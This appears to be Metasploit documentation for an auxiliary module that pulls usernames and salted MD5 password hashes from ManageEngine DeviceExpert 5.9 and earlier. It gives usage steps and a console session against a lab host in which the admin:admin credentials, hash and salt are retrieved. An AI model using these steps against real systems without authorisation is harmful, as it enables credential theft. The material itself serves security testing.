## Decription

  This module extracts usernames and salted MD5 password hashes
  from ManageEngine DeviceExpert version 5.9 build 5980 and prior.


## Vulnerable Software

  [DeviceExpert](http://www.manageengine.com/products/device-expert) is a
  web–based, multi-vendor network configuration and change management (NCCM)
  solution for switches, routers, firewalls and other network devices.

  This module has been tested successfully on DeviceExpert
  version 5.9.7 build 5970 on Windows XP SP3.

  Software download:

  * [5.8 build 5850](http://web.archive.org/web/20130123070454/http://www.manageengine.com/products/device-expert/download.html)
  * [5.9 build 5900](http://web.archive.org/web/20130304043822/http://www.manageengine.com/products/device-expert/download.html)
  * [5.9 build 5950](http://web.archive.org/web/20131029082827/http://www.manageengine.com/products/device-expert/download.html)


## Verification Steps

  1. Do: ```use auxiliary/scanner/http/manageengine_deviceexpert_user_creds```
  2. Do: ```set RHOSTS [IP]```
  3. Do: ```run```
  4. You should receive usernames and associated password hashes + salts


## Scenarios

  ```
  msf5 > use auxiliary/scanner/http/manageengine_deviceexpert_user_creds 
  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > set rhosts 172.16.158.131
  rhosts => 172.16.158.131
  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > check
  [+] 172.16.158.131:6060 - The target is vulnerable.
  [*] Checked 1 of 1 hosts (100% complete)
  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > run

  [*] 172.16.158.131:6060 - Found weak credentials (admin:admin)

  ManageEngine DeviceExpert User Credentials
  ==========================================

   Username  Password  Password Hash                     Role           E-mail                Password Salt
   --------  --------  -------------                     ----           ------                -------------
   admin     admin     3a4ebf16a4795ad258e5408bae7be341  Administrator  noreply@zohocorp.com  12345678

  [*] Credentials saved in: /Users/jvazquez/.msf4/loot/20140926165907_default_172.16.158.131_manageengine.dev_118155.txt
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed
  msf5 auxiliary(scanner/http/manageengine_deviceexpert_user_creds) > creds 172.16.158.131
  Credentials
  ===========

  host            service           public  private  realm  private_type
  ----            -------           ------  -------  -----  ------------
  172.16.158.131  6060/tcp (https)  admin   admin           Password
  ```

